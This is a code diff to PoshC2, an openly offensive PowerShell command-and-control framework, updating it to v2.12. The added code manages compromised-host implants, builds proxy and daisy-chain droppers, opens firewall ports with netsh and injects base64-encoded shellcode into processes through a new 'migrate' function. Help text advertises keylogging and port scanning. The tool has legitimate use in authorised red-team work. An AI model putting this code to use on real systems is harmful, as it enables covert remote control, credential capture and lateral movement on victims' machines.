@@ -116,7 +116,7 @@ $header = '
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v2.11 www.PoshC2.co.uk =============" -ForegroundColor Green
+            Write-Host "============== v2.12 www.PoshC2.co.uk =============" -ForegroundColor Green
             Write-Host "===================================================" `n -ForegroundColor Green
 
             foreach ($implant in $dbresults) 
@@ -132,7 +132,8 @@ $header = '
                 $im_sleep = $implant.Sleep
                 $im_domain = $implant.Domain
                 $pivot = $implant.Pivot
-                if ($pivot -eq "YES"){$pivotimplant = " D"}
+                if ($pivot -eq "Daisy"){$pivotimplant = " D"}
+                if ($pivot -eq "Proxy"){$pivotimplant = " P"}
                 if ($randomurihost) {
                     if (((get-date).AddMinutes(-10) -gt $implant.LastSeen) -and ((get-date).AddMinutes(-59) -lt $implant.LastSeen)){
                         Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)$($pivotimplant)" -ForegroundColor Yellow
@@ -606,7 +607,9 @@ $header = '
         write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
         write-host " Invoke-Portscan -Hosts 192.168.1.1/24,10.10.10.10 -T 4 -Ports `"445,3389,22-25`" | Select Hostname,OpenPorts" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
-        write-host " Migrate-x64" -ForegroundColor Green
+        write-host " Migrate" -ForegroundColor Green
+        write-host " Migrate -ProcID 444" -ForegroundColor Green
+        write-host " Migrate -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
         write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
         write-host " Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
         write-host " Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
@@ -711,7 +714,7 @@ function CreateProxyPayload
         [Parameter(Mandatory=$true)][AllowEmptyString()][string]$password,
         [Parameter(Mandatory=$true)][string]$proxyurl
     )        
-    $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl
+    $command = createdropper -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl
     $payload = createrawpayload -command $command
     # create proxy payloads
     CreatePayload -Proxy 1
@@ -732,7 +735,12 @@ param(
 [Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyuser, 
 [Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxypassword)
 
-$command = createdropper -Daisy 1 -killdate $killdatefm -ipv4address $daisyserver -serverport $port 
+$fw = Read-Host "Do you want to create a firewall rule for this: Y/N"
+if ($fw -eq "Y") {
+    $fwcmd = "Netsh.exe advfirewall firewall add rule name=`"Daisy`" dir=in action=allow protocol=TCP localport=$port enable=yes"
+}
+
+$command = createdropper -Daisy -killdate $killdatefm -ipv4address $daisyserver -serverport $port 
 $payload = createrawpayload -command $command
 
 # create proxy payloads
@@ -792,7 +800,7 @@ if (`$cookie) {
 <address>Apache (Debian) Server</address>
 </body></html>
 '
-`$URLS = $($URLS),"/connect","/daisy"
+`$URLS = $($URLS),"/connect","/daisy","/proxy"
 `$listener = New-Object -TypeName System.Net.HttpListener 
 `$listener.Prefixes.Add("http://+:`$serverport/") 
 `$listener.Start()
@@ -869,6 +877,7 @@ $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
 $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))    
 
 $rundaisy = @"
+$fwcmd
 `$t = Invoke-Netstat| ? {`$_.ListeningPort -eq $port}
 if (!`$t) { 
     if (Test-Administrator) { 
@@ -1138,6 +1147,63 @@ function migrate-daisy {
         return $null
     }
 }
+
+function migrate($psrandomuri, $params) {
+$dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$psrandomuri'" -As PSObject
+
+$im_arch = $dbresult.Arch
+$im_type = $dbresult.Pivot
+
+if ($im_arch -eq "AMD64"){
+    $arch = "64"
+}
+else {
+    $arch = "86"
+}
+
+CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
+
+if ($im_type -eq "Normal"){
+    if (Test-Path "$FolderPath\payloads\Posh-shellcode_x$($arch).bin"){
+    $bytes = (Get-Content "$FolderPath\payloads\Posh-shellcode_x$($arch).bin" -Encoding Byte)
+    $base64 = [System.Convert]::ToBase64String($bytes)
+    $commandstring = "`$Shellcode$($arch) = `"$base64`""
+    RunImplantCommand $commandstring $psrandomuri                     
+    return "Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String(`$Shellcode$($arch))) $($params)"
+    } else {
+        write-host "Error cannot find shellcode"
+        return $null
+    }
+}
+elseif ($im_type -eq "Daisy"){
+    $Name = read-host "Name required: "
+    if (Test-Path "$FolderPath\payloads\DaisyPosh_$($name)-shellcode_x$($arch).bin"){
+    $bytes = (Get-Content "$FolderPath\payloads\DaisyPosh_$($name)-shellcode_x$($arch).bin" -Encoding Byte)
+    $base64 = [System.Convert]::ToBase64String($bytes)
+    $commandstring = "`$Shellcode$($arch) = `"$base64`""
+    RunImplantCommand $commandstring $psrandomuri                     
+    return "Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String(`$Shellcode$($arch))) $($params)"
+    } else {
+        write-host "Need to run Invoke-DaisyChain first"
+        return $null
+    }
+}
+elseif ($im_type -eq "Proxy"){
+    if (Test-Path "$FolderPath\payloads\ProxyPosh-shellcode_x$($arch).bin"){
+    $bytes = (Get-Content "$FolderPath\payloads\ProxyPosh-shellcode_x$($arch).bin" -Encoding Byte)
+    $base64 = [System.Convert]::ToBase64String($bytes)
+    $commandstring = "`$Shellcode$($arch) = `"$base64`""
+    RunImplantCommand $commandstring $psrandomuri                     
+    return "Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String(`$Shellcode$($arch))) $($params)"
+    } else {
+        write-host "Need to run CreateProxyPayload first"
+        return $null
+    }
+}
+
+
+}
+
 
 # run startup function
 startup
@@ -1465,6 +1531,12 @@ param
                 $pscommand = $pscommand -replace 'migrate-daisy-x64','migrate-daisy -arch 64'
                 $pscommand = IEX $pscommand
             }
+            if ($pscommand.ToLower().StartsWith('migrate'))
+            {
+                $pscommand = $pscommand -replace 'migrate ',''
+                $pscommand = IEX "migrate $psrandomuri `"$pscommand`""
+            }
+
             if ($pscommand.ToLower().StartsWith('invoke-psinject-payload'))
             { 
                 CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
